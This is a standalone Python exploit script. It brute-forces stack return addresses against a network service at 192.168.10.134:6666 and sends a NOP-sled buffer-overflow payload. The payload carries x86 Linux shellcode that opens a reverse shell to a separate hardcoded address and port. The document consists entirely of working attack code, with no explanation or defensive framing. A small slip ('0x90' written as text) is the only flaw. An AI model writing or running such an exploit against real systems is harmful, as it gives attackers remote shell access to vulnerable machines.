#!/usr/bin/python3

import socket

IPADDR = "\xc0\xa8 \x0a\x32"
PORT =  "\xc7\x38"
buf = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
            "\xb0\x66\xb3\x01\x51\x6a\x06\x6a"
            "\x01\x6a\x02\x89\xe1\xcd\x80\x89"
            "\xc6\xb0\x66\x31\xdb\xb3\x02\x68"
            +IPADDR+"\x66\x68"+PORT+"\x66\x53\xfe"
            "\xc3\x89\xe1\x6a\x10\x51\x56\x89"
            "\xe1\xcd\x80\x31\xc9\xb1\x03\xfe"
            "\xc9\xb0\x3f\xcd\x80\x75\xf8\x31"
            "\xc0\x52\x68\x6e\x2f\x73\x68\x68"
            "\x2f\x2f\x62\x69\x89\xe3\x52\x53"
            "\x89\xe1\x52\x89\xe2\xb0\x0b\xcd"
            "\x80")


HOST = "192.168.10.134"
PORT = 6666
for i in range(0xff,0x00,-1):
	for j in range(0,0xff,4):

		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((HOST,PORT))
		p = "0x90"*44 +chr(j)+chr(i)+"\xff\xbf" + "\x90"*(256-48-len(buf))+buf
		s.send(p.encode())
		s.close()
		print("0xbffff%02x%02x" % (i, j))